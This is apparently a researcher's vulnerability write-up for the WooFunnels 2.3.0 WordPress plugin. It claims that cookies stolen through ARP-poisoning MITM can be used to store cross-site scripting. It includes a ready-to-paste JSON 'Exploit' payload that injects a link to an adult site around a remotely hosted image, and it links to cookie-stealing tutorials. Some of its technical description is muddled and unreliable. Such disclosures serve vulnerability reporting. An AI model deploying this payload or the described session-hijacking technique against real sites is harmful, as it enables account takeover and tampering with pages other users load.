## [WooFunnels-2.3.0](https://wordpress.org/plugins/funnel-builder/)

## [Vendor](https://wordpress.org/)

![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/WordPress/2022/WooFunnels-2.3.0/Docs/Screenshot%202022-09-12%20120750.png)

## Description:
The WooFunnels-2.3.0 plugin suffers from Medium-HIGH risk vulnerabilities to MITM-Session-Token-URL hijacking and XSS-Stored attacks.
The malicious user can arp poisoning the inside network traffic by using a MITM technique plus vectorizing the original login page of this system, in layer 2 to steal a cookie session, from the active session of some authorized user. 
Then he can use this cookie to store a malicious javascript code into the system. 
After this, he can just disappear from the infected traffic leaving the victims to click on the already stored-infected image link and fall into his trap.

## CONCLUSION:
This is not so horrible, but can be!
Not sanitizing well function, for Sales Pages. 
This rule must be for all privileges of users into the API of this system.
BR

STATUS: Medium - HIGH

[+] Exploit:

```
{"settings":"{\"css\":\"\\n\",\"script\":\"<a href=\\\"https://pornhub.com/\\\" target=\\\"_blank\\\" rel=\\\"noopener nofollow ugc\\\">\\n<img src=\\\"https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/nu11secur1ty/images/IMG_0068.gif?token=GHSAT0AAAAAABXWGSKOH7MBFLEKF4M6Y3YCYYKADTQ&rs=1\\\" style=\\\"border:1px solid black;max-width:100%;\\\" alt=\\\"Photo of Byron Bay, one of Australia's best beaches!\\\">\\n</a>\"}"}

```

## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/WordPress/2022/WooFunnels-2.3.0)

## Proof and Exploit:
[href](https://streamable.com/o7cq8o)

## Stealing cookie by PortSwigger:
[href](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)

## m0r3:
[href](https://portswigger.net/support/using-burp-to-hack-cookies-and-manipulate-sessions)
